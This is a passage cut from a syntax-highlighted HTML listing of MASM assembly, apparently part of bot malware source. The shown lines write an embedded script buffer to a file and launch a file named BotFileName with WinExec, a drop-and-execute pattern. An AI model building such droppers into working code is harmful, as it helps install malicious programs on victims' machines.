        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BeginOfScript</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndOfScript</span><span class="sc4">-</span><span class="sc5">BeginOfScript</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WinExec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BotFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">


    </span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0"> 

</span></div></body>
</html>
